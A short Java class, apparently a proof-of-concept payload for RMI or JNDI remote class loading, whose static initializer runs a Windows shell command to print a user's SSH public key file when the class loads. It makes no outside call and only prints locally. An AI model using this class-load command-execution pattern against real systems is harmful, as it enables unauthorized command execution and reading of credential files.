import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class RMIServer {
    static {
        String [] cmd = {"cmd", "/C", "type", "\\Users\\LuZhong\\.ssh\\id_rsa.pub"};
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            try(BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"))) {
                String line;
                while((line=br.readLine())!=null) {
                    System.out.println(line);
                }
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}
